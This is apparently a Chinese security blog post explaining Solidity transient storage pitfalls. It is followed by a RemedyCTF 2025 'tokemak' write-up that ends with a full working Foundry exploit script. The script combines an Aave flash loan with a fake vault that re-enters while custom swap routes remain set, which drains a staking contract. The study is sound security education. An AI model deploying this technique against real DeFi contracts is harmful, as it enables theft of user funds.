# Transient Storage Vulns in Solidity-先知社区

> **来源**: https://xz.aliyun.com/news/17158  
> **文章ID**: 17158

---

## TL;DR

本文介绍了Solidity 0.8.24的新功能Transient Storage及其应用，探讨了开发者不当使用可能引发的安全问题。通过RemedyCTF 2025 tokemak题目案例分析，着重展示了Transient Storage在组合条件下被恶意复用造成的危害

## Transient Storage

在Solidity 0.8.24之后，加入了对Transient Storage的支持。具体来说，增加了`TSTORE`和`TLOAD`两个字节码。Transient Storage最初的提案来自于[EIP-1153](https://eips.ethereum.org/EIPS/eip-1153)

Transient Storage是EVM级别的，不同于`memory`, `storage`, `calldata`的第四种数据存储位置，采用键值方式存储。Transient Storage的特点是只在同一个交易中有效，交易结束时会被清零。相比`storage`，Transient Storage的gas费更低，更适合临时存储的场景，为开发者提供了更灵活的存储方案

在Solidity 0.8.28中，对Transient Storage的支持更完善，加入了`transient`关键字，开发者无需使用assembly字节码就可以方便地使用Transient Storage。但由于0.8.28版本是自2024年10月至今的最新版本，在目前项目合约中还不常见

在[soliditylang blog](https://soliditylang.org/blog/2024/01/26/transient-storage/)中，给出了使用Transient Storage实现重入锁的简单示例：

```
contract Generosity {
    mapping(address => bool) sentGifts;

    modifier nonreentrant {
        assembly {
            if tload(0) { revert(0, 0) }
            tstore(0, 1)
        }
        _;
        // Unlocks the guard, making the pattern composable.
        // After the function exits, it can be called again, even in the same transaction.
        assembly {
            tstore(0, 0)
        }
    }
    function claimGift() nonreentrant public {
        require(address(this).balance >= 1 ether);
        require(!sentGifts[msg.sender]);
        (bool success, ) = msg.sender.call{value: 1 ether}("");
        require(success);

        // In a reentrant function, doing this last would open up the vulnerability
        sentGifts[msg.sender] = true;
    }
}
```

## Composability Danger

### 跨交易不可组合

在[soliditylang blog](https://soliditylang.org/blog/2024/01/26/transient-storage/)中，给出了这样一个例子：

```
contract MulService {
    function setMultiplier(uint multiplier) external {
        assembly {
            tstore(0, multiplier)
        }
    }

    function getMultiplier() private view returns (uint multiplier) {
        assembly {
            multiplier := tload(0)
        }
    }

    function multiply(uint value) external view returns (uint) {
        return value * getMultiplier();
    }
}
```

对于连续的三个交易：

```
setMultiplier(42);
multiply(1);
multiply(2);
```

multiply调用预期输出应该是42、84，但由于不在同一个交易，setMultiplier调用设置后在后续交易中没有作用，故后续输出都是0

使用storage进行变量存储则符合预期。尤其在0.8.28之后，使用`transient`关键字声明变量，可能更容易引起非预期行为

### 恶意组合复用

在同一个交易中，设置的transient变量会一直存在，且跨函数调用有效，如果一次设置的transient变量被多次重复利用，就会出现非预期的结果。在[soliditylang blog](https://soliditylang.org/blog/2024/01/26/transient-storage/)中，建议开发者**在函数调用结束时将transient变量删除干净**：

> We recommend to generally always clear transient storage completely at the end of a call into your smart contract to avoid these kinds of issues and to simplify the analysis of the behaviour of your contract within complex transactions.

**然而，如果使用transient变量函数调用过程中，存在外部合约 / 用户可控合约的调用，即使整个函数结束后及时清除transient变量，transient变量仍有被恶意组合复用的可能**

下面使用RemedyCTF 2025 中 tokemak 题目举例说明

## 案例分析 - RemedyCTF2025 tokemak

> 附件及Docker环境可在[RemedyCTF官网](https://ctf.r.xyz)或笔者[百度网盘](https://pan.baidu.com/s/1urJvccL86N99LNYa5L2Cdw?pwd=z9u9)找到
>
> 思路来源：[chainlight team tokemak Writeup](https://github.com/theori-io/ctf/blob/master/2025/remedyctf/tokemak.md)

### 0x00 题目简介

> Description：I found this cool protocol called Tokemak that lets you earn maximized yield on your ETH! I'd recommend pooling all our autoETH together in my new LFG Staker contract, otherwise you're definitely ngmi.

题目依托[tokemak项目](https://www.tokemak.xyz/)建立`LFGStaker`合约，用户可将tokemak的autoETH代币（类似于LP token）质押到`LFGStaker`合约中，获得收益。题目目标是耗尽`LFGStaker`合约中的初始资产

### 0x01 Tokemak简介

想要做LP的用户往往需要谨慎选择收益大的池子，且需要密切关注池子动向，以保证盈利，整个过程十分麻烦。tokemak瞄准这个痛点，提出将LP资金集中到一起，通过算法计算出收益最大的池子，并自动为用户选择资金流向，以获得收益最大化

简单来说，用户在DEX进行交易时可以使用`聚合器`，tokemak就是要做LP的聚合器

想要完全理解题目，最好还是把[tokemak开发者文档](https://docs.tokemak.xyz/developer-docs/contracts-overview)通读一遍，这里不再赘述

### 0x02 初步分析

浏览一下`LFGStaker`合约：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "src/tokemak/SystemRegistry.sol";
import "src/tokemak/vault/AutopilotRouter.sol";
import "src/tokemak/vault/AutopoolETH.sol";
import "src/tokemak/interfaces/utils/IWETH9.sol";

contract LFGStaker is ERC20 {
    IWETH9 public immutable weth;
    SystemRegistry public immutable system;
    AutopoolETH public immutable autoETH;
    IAutopilotRouter public immutable router;

    constructor(SystemRegistry _system, AutopoolETH _autoETH) ERC20("LFG Staker", "LFGS") {
        autoETH = _autoETH;
        system = _system;
        weth = system.weth();
        router = system.autoPoolRouter();
        weth.approve(address(router), type(uint256).max);
        autoETH.approve(address(router), type(uint256).max);
    }

    function deposit(uint256 amount) external {
        uint256 assets = autoETH.convertToAssets(amount);
        uint256 shares = convertToShares(assets, false);

        _mint(msg.sender, shares);

        autoETH.transferFrom(msg.sender, address(this), amount);
    }

    function mint(uint256 shares) external {
        uint256 assets = convertToAssets(shares, true);
        uint256 amount = autoETH.convertToShares(assets);

        _mint(msg.sender, shares);

        autoETH.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 amount) external {
        uint256 assets = autoETH.convertToAssets(amount);
        uint256 shares = convertToShares(assets, true);

        _burn(msg.sender, shares);

        autoETH.transfer(msg.sender, amount);
    }

    function redeem(uint256 shares) external {
        uint256 assets = convertToAssets(shares, false);
        uint256 amount = autoETH.convertToShares(assets);

        _burn(msg.sender, shares);

        autoETH.transfer(msg.sender, amount);
    }

    function convertToAssets(uint256 shares, bool up) public returns (uint256) {
        uint256 totalAssets = totalAssets();
        uint256 totalSupply = totalSupply();
        if (totalSupply == 0) {
            return shares;
        }
        return ((shares * totalAssets) + (up ? totalSupply - 1 : 0)) / totalSupply;
    }

    function convertToShares(uint256 assets, bool up) public returns (uint256) {
        uint256 totalAssets = totalAssets();
        uint256 totalSupply = totalSupply();
        if (totalAssets == 0) {
            return assets;
        }
        return ((assets * totalSupply) + (up ? totalAssets - 1 : 0)) / totalAssets;
    }

    function totalAssets() public returns (uint256) {
        return autoETH.previewRedeem(autoETH.balanceOf(address(this)));
    }
}

```

对于这种deposit assets、redeem shares的合约，由于涉及assets和shares之间的转换，首先就得考虑是否存在除法精度上的套利。这里涉及到向上 / 向下取整。可以发现，计算向外发送代币的数量没有被放大的可能，精度上损失的代币会留在合约内，也就不存在套利机会

整个合约十分简单，只有存入和取出两条路，所以唯一的机会就在`totalAssets`函数中对autoETH合约的调用。如果我们能在deposit时降低totalAssets或在redeem时放大totalAssets，那么就可以套利

### 0x03 攻击路径

`totalAssets`函数会调用`autoETH.previewRedeem`，里面会有一个非常复杂的调用过程，简化来说：

1. preview操作会进行low level call，最后revert，previewRedeem即call redeem
2. autoETH合约查看闲置资金能否满足需求，能满足即结束
3. 闲置资金不足，尝试从流动性池（DestVault）中取出流动性
4. 取出的流动性为冲入的两种代币，但用户需要的只有一种代币（Basic Asset），需要将另一种代币转换成Basic Asset
5. 交换所用的池子可以自动取用，也可以用户指定
6. 最后将所有的代币返回给用户，Burn掉LP token（autoETH）

对应tokemak合约函数大致如下：

```
previewRedeem 
_withdrawAssets
destVault.withdrawBaseAsset
_withdrawBaseAsset
swapRouter.swapForQuote
_swapForQuoteUserRoute
```

问题就出在最后的交换步骤，用户可以自由指定交换的池子，哪怕是一个用户编写的任意汇率的池子，这个池子直接影响着用户redeem最终拿到的资金，即也影响着`totalAssets`，这完全符合我们套利的需求

而决定是否使用用户指定的池子，就会查看是否设置了相应的Transient Storage变量，这就回到了本文的主题

接下来的问题就是：

1. 初始资金哪里来？题目player用户初始只有1 ether ETH，套利效率太低 使用闪电贷（flashloan）借出资金，完成套利。可以使用Aave的api，有详细的[文档](https://aave.com/docs/developers/flash-loans)，写起来非常方便。在实际的DeFi攻击事件中，也到处都是闪电贷的身影。也有很多攻击者使用dydx的闪电贷服务，好处是没有手续费，但文档不全，写起来比较麻烦
2. 如何在同一次交易中设定Transient Storage变量，并进行恶意复用？ 经过搜索发现，`AutopilotRouter`合约中`redeemWithRoutes`函数会使用`swapRouter.initTransientSwap`设定用户指定的`customRoutes`，即交换所用的池子。但在`redeemWithRoutes`最后会使用`swapRouter.exitTransientSwap`清空Transient变量，怎么办呢？ 可以发现，在`redeemWithRoutes`中间会调用`vault.redeem`，而vault地址也是用户传入的，如果我们将vault设置成攻击合约的地址，在执行`vault.redeem`时就能重新执行我们的攻击代码，且此时`customRoutes`已被设置。同时，`redeemWithRoutes`作为router合约中的函数，对vault也没有多余的检查或使用，我们只需写一个相同签名的`redeem`函数即可

### 0x04 Exploit Script

剩下的工作就是根据各种API组装整个攻击流程，最终调整deposit参数、套利轮数达到题目要求即可。完整EXP：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Script, console2 as console} from "forge-std/Script.sol";

import "../src/Challenge.sol";
import "../src/tokemak/vault/AutopilotRouter.sol";
import "../src/tokemak/vault/AutopoolETH.sol";
import { TransientStorage } from "../src/tokemak/libs/TransientStorage.sol";

interface IAAVELendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract Solve is Script {
    address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    AutopoolETH public autoETH = AutopoolETH(0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56);
    address chall;
    Challenge challenge;
    Attack attack;
    LFGStaker lfg;
    address player;

    function setUp() public {
        chall = vm.envAddress("CHALL");
        challenge = Challenge(chall);
        lfg = LFGStaker(challenge.LFG_STAKER());
        player = challenge.PLAYER();
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        attack = new Attack(chall);
        for (uint i = 0; i < 100; i++) {
            if (challenge.isSolved()) {
                console.log("SOLVED");
                break;
            }
            attack.run();
            if (i == 40) attack.setDepositAmount(0.16 ether);
            console.log(i);
            console.log("lfg autoETH balance:", autoETH.balanceOf(address(lfg)));
            console.log("player weth balance:", player.balance);
        }
        vm.stopBroadcast();
    }
}

contract Attack is IFlashLoanReceiver {
    address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    AutopoolETH public autoETH = AutopoolETH(0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56);
    AutopilotRouter public autoRouter = AutopilotRouter(payable(0xC45e939ca8C43822A2A233404Ecf420712084c30));
    IAAVELendingPool public aaveLendingPool = IAAVELendingPool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address chall;
    address player;
    Challenge challenge;
    LFGStaker lfg;

    constructor(address _chall) {
        chall = _chall;
        challenge = Challenge(chall);
        player = challenge.PLAYER();
        lfg = LFGStaker(challenge.LFG_STAKER());
    }

    function setDepositAmount(uint256 _amount) public {
        depositAmount = _amount;
    }

    function run() external {
        address[] memory assets = new address[](1);
        assets[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    
        IWETH9(weth).withdraw(IERC20(weth).balanceOf(address(this)));
        payable(player).transfer(address(this).balance);
    }
  
    uint256 public depositAmount = 1 ether;
    bool hacked = false;

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // deposit autoETH
        IERC20(weth).transfer(address(autoRouter), depositAmount);
        autoRouter.depositBalance(IAutopool(autoETH), address(this), 0);

        // set custom routes
        ISwapRouterV2.UserSwapData[] memory customRoutes = new ISwapRouterV2.UserSwapData[](1);
        customRoutes[0] = ISwapRouterV2.UserSwapData({
            // first DstVault(PXETH/WETH) PXETH address 
            fromToken: address(0x04C154b66CB340F3Ae24111CC767e0184Ed00Cc6), 
            // autoETH basic asset
            toToken: address(weth),
            target: address(this),
            data: "hacked by dx3906"
        });

        // deposit LFG
        hacked = false;
        autoRouter.redeemWithRoutes(
            IAutopool(address(this)), address(this), 0, 0, customRoutes);

        // redeem LFG
        hacked = true;
        autoRouter.redeemWithRoutes(
            IAutopool(address(this)), address(this), 0, 0, customRoutes);

        // redeem autoETH
        IERC20(autoETH).approve(address(autoRouter), type(uint256).max);
        autoRouter.redeemMax(autoETH, address(this), 0);

        // approve repay
        IERC20(weth).approve(address(aaveLendingPool), type(uint256).max);
        return true;
    }

    function redeem(uint256, address, address) external returns (uint256){
        if (!hacked) {
            // deposit LFG
            IERC20(autoETH).approve(address(lfg), type(uint256).max);
            lfg.deposit(IERC20(autoETH).balanceOf(address(this)));
        } else {
            // redeem LFG
            lfg.redeem(IERC20(lfg).balanceOf(address(this)));
        }
    }

    fallback(bytes calldata data) external returns (bytes memory) {
        if (hacked) {
            IERC20(weth).transfer(msg.sender, IERC20(weth).balanceOf(address(this)));
        }
        return data;
    }

    receive() external payable {}

}
```
